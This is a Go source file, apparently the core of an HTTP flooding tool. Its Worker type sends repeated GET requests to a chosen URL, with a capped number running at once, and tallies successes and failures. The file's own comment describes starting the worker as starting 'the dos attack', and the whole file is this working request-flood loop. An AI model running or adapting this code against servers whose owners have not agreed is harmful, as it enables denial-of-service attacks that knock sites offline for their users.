package core

import (
	"fmt"
	"net/http"
	"time"
)

// NewWorker creats a new worker assigning a unique Channel and ID
func (w *Worker) NewWorker() {
	w.Channel = make(chan bool)
	w.ID = time.Now().Unix()
}

// StartWorker starts the dos attack
func (w *Worker) StartWorker(info *Info, numberOfRequests int, url string) {
	w.MaxRequests = make(chan bool, numberOfRequests)
	go w.attack(info, url)
}

// StopWorker stops the attack by closing all channels
func (w *Worker) StopWorker() {
	close(w.Channel)
}

func (w *Worker) attack(info *Info, url string) {
	for {
		select {
		case <-w.Channel:
			fmt.Println("Worker Stopped: ", w.ID)
			return
		default:
			w.MaxRequests <- true
			go w.request(info, url)
		}
	}
}

func (w *Worker) request(i *Info, url string) {
	start := time.Now()
	resp, e := http.Get(url)
	if e == nil {
		secs := time.Since(start).Seconds()
		fmt.Println(secs)
	}

	if e != nil {
		countRequest(i, http.StatusBadRequest, e)
	} else {
		countRequest(i, resp.StatusCode, e)
	}
	if w.frequency(10) {
		return
	}
	<-w.MaxRequests
}

func (w *Worker) frequency(wait time.Duration) bool {
	select {
	case <-w.Channel:
		return true
	default:
		time.Sleep(wait * time.Millisecond)
		return false
	}
}

func countRequest(i *Info, status int, e error) {
	i.Requests++
	if e != nil {
		i.NetworkFailed++
		return
	}
	if status == http.StatusOK {
		i.Success++
	} else {
		i.BadFailed++
	}
}
